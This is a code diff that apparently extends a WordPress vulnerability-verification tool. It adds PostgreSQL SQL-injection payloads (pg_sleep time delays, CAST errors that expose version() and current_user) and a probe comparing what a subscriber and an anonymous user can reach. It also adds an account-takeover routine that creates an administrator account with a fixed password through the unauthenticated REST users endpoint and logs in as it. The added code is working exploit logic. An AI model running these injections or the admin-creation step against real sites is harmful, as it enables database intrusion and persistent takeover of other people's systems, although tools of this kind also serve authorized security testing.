@@ -9787,6 +9787,72 @@ def verify_wordpress_sqli(
             if _seen:
                 res.evidence["sqli_techniques_tried"] = _seen
 
+        # PostgreSQL fallback: when all MySQL techniques fail and response signals Postgres,
+        # retry with pg_sleep / CAST(version()) error-based payloads.
+        if not res.verified and boot is not None and sqli_param:
+            _pg_signals = ("postgresql", "pg_catalog", "pgsql", "psycopg",
+                           "ERROR:  operator does not exist", "integer", "pg_sleep")
+            _all_resp_text = " ".join(
+                str(ft.get("body_muestra", "") or "") for ft in res.failure_trace)
+            _is_postgres = any(s.lower() in _all_resp_text.lower() for s in _pg_signals)
+            if _is_postgres:
+                step("SQLi: detectadas señales PostgreSQL — probando payloads pg_sleep / CAST")
+                _pg_payloads_time = [
+                    ("'; SELECT pg_sleep(5)-- -", "'; SELECT pg_sleep(0)-- -"),
+                    ("' OR (SELECT pg_sleep(5))='1", "' OR (SELECT pg_sleep(0))='1"),
+                    ("1; SELECT pg_sleep(5)-- -", "1; SELECT pg_sleep(0)-- -"),
+                ]
+                _pg_error_payloads = [
+                    "' AND 1=CAST((SELECT version()) AS INT)-- -",
+                    "' AND 1=CAST((SELECT current_user) AS INT)-- -",
+                    "1 AND 1=CAST((SELECT version()) AS INT)-- -",
+                ]
+                _pg_version_signals = ("postgresql", "pg ", "9.", "10.", "11.", "12.", "13.", "14.", "15.")
+                # Error-based first (faster)
+                for _pgp in _pg_error_payloads:
+                    try:
+                        _pgr = send(_pgp)
+                        _pgb = (_pgr.text if hasattr(_pgr, "text") else "")[:500]
+                        if any(s in _pgb.lower() for s in _pg_version_signals):
+                            res.verified = True
+                            res.ok = True
+                            res.confidence = "confirmed"
+                            res.evidence["tecnica"] = "postgres-error-based"
+                            res.evidence["postgres_version_snippet"] = _pgb[:200]
+                            res.detail = "PostgreSQL error-based SQLi: version() extracted via CAST error"
+                            step(f"SQLI POSTGRES error-based confirmado: {_pgb[:80]}")
+                            break
+                    except Exception:
+                        pass
+                # Time-based fallback
+                if not res.verified:
+                    _pg_tb_baseline = []
+                    for _ in range(2):
+                        try:
+                            _t0 = time.time()
+                            send(orig_value)
+                            _pg_tb_baseline.append(time.time() - _t0)
+                        except Exception:
+                            pass
+                    _pg_threshold = max(3.5, (sum(_pg_tb_baseline) / len(_pg_tb_baseline)
+                                              if _pg_tb_baseline else 0.5) * 2.5)
+                    _pg_consistent = 0
+                    for _pgs, _pgf in _pg_payloads_time:
+                        try:
+                            _t0f = time.time(); send(_pgf); _pgft = time.time() - _t0f
+                            _t0s = time.time(); send(_pgs); _pgst = time.time() - _t0s
+                            if (_pgst - _pgft) >= _pg_threshold:
+                                _pg_consistent += 1
+                        except Exception:
+                            pass
+                    if _pg_consistent >= 1:
+                        res.verified = True
+                        res.ok = True
+                        res.confidence = "probable"
+                        res.evidence["tecnica"] = "postgres-time-based"
+                        res.detail = f"PostgreSQL time-based blind SQLi: pg_sleep delay consistent ({_pg_consistent} pairs)"
+                        step(f"SQLI POSTGRES time-based confirmado: {_pg_consistent} pares")
+
         # Post-exploit escalation for SQLi: extract version, user(), hashes
         if res.verified and boot is not None:
             try:
@@ -13552,6 +13618,79 @@ def verify_wordpress_missing_auth_probe(
                             break
                     except Exception:
                         pass
+
+        # Subscriber-role escalation: compare subscriber vs anon response.
+        # Subscriber getting MORE data than anon proves capability bypass (not just missing-auth).
+        if not res.verified and status == 200 and len(body.strip()) > 20 and boot is not None:
+            try:
+                _sub_resp = boot.sub_sess.request(
+                    m, boot.base_url + endpoint,
+                    json=params_dict if (m not in ("GET", "HEAD") and json_body) else None,
+                    data=params_dict if (m not in ("GET", "HEAD") and not json_body) else None,
+                    params=params_dict if m == "GET" else None,
+                    timeout=20, allow_redirects=True)
+                _sub_body = (_sub_resp.text or "")[:2000]
+                _sub_st = _sub_resp.status_code
+                _admin_body_check = res.evidence.get("auth_delta", {}).get("admin_snippet", "")
+                _sub_matches_admin = (_admin_body_check and
+                                      _sub_body.strip()[:100] == _admin_body_check[:100])
+                _sub_differs_anon = (len(_sub_body.strip()) > 50 and
+                                     _sub_body.strip()[:100] != body.strip()[:100])
+                if _sub_st == 200 and (_sub_matches_admin or _sub_differs_anon):
+                    res.verified = True
+                    res.confidence = "confirmed"
+                    res.evidence["subscriber_escalation"] = {
+                        "subscriber_status": _sub_st,
+                        "subscriber_body_len": len(_sub_body.strip()),
+                        "matches_admin": _sub_matches_admin,
+                        "differs_from_anon": _sub_differs_anon,
+                        "sub_snippet": _sub_body.strip()[:200],
+                    }
+                    res.detail = (f"subscriber-role privilege escalation: subscriber ({_sub_st}) "
+                                  f"accede a datos que difieren del anon → capability bypass")
+                    step("SUBSCRIBER ESCALATION: sub differs from anon → confirmed")
+            except Exception:
+                pass
+
+        # Account takeover via unauthenticated REST user creation.
+        # When write-access was proven, try creating an admin user via WP REST API.
+        if (res.evidence.get("write_access_proven") and
+                not res.evidence.get("account_creation_tested") and boot is not None):
+            _new_uname = f"binoracle_test_{int(time.time()) % 10000}"
+            _new_upw = "BinOracle_Test_2024!"
+            _new_user = {
+                "username": _new_uname,
+                "email": f"bo_test_{int(time.time()) % 10000}@example.com",
+                "password": _new_upw,
+                "roles": ["administrator"],
+                "name": "BinOracle Test",
+            }
+            try:
+                for _users_ep in ("/wp-json/wp/v2/users", endpoint):
+                    _cr = anon_sess.request(
+                        "POST", boot.base_url + _users_ep,
+                        json=_new_user, timeout=20, allow_redirects=True)
+                    _cs = _cr.status_code
+                    _cb = (_cr.text or "")[:500]
+                    res.evidence["account_creation_tested"] = {
+                        "endpoint": _users_ep, "status": _cs, "body": _cb[:200]}
+                    if _cs in (200, 201) and "id" in _cb.lower():
+                        _new_sess = _wp_login(boot.base_url, _new_uname, _new_upw,
+                                              on_step=step)
+                        if _new_sess:
+                            res.verified = True
+                            res.confidence = "confirmed"
+                            res.evidence["account_takeover_via_rest"] = {
+                                "username": _new_uname,
+                                "login_verified": True,
+                                "creation_status": _cs,
+                            }
+                            res.detail = ("account takeover: admin user created via "
+                                          "unauthenticated REST API and login verified")
+                            step("ACCOUNT TAKEOVER: admin user created via REST → confirmed")
+                            break
+            except Exception:
+                pass
 
         # Write access escalation: if GET succeeds without auth, try mutating methods.
         # Proves the endpoint also allows writes without auth, which is higher impact.
